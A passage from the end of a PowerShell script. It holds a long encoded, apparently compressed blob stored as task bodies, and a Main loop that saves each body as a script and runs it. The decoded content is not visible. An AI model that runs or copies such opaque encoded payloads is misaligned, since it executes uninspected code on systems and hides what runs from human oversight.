4Nxqh5/26pe7dmeSZ7iQiJEXuREGG0MTq+yF1atxtypPvyLTEFkjXzjCVnJyIlCUC/EAD8iWZnZHfMyIkci84zU3kXgiygwX14RKMOkk/IjJkAax4rRcxCrpQFJSZUO87wsZiu99v38/DajYybxw2+7S/jGS+dVNyLZ5Ur94A/SZJ0+varjZUXxuHlaveUtsrIgveK4h6xutoNYor9qmo6e4zTvC1cdJq1TAe4jKrZA00zKnbBjXB1f0QmqgmHEVMwmYA3AoCrFyZLYR5+qR5cXiliIN+X1P5H5afDLJwQAAA"

        }

        writedbg "Main - "
        foreach ($key in $tasks.Keys)
        {
            $task = $key
            $body = $tasks.$key
            writedbg "Main - $task"
            Save-Script -taskName $task -Body $body
            Invoke-Script -taskName $task
        }
    }
}

Main

if ($globalDebug)
{
    Start-Sleep -Seconds 100
}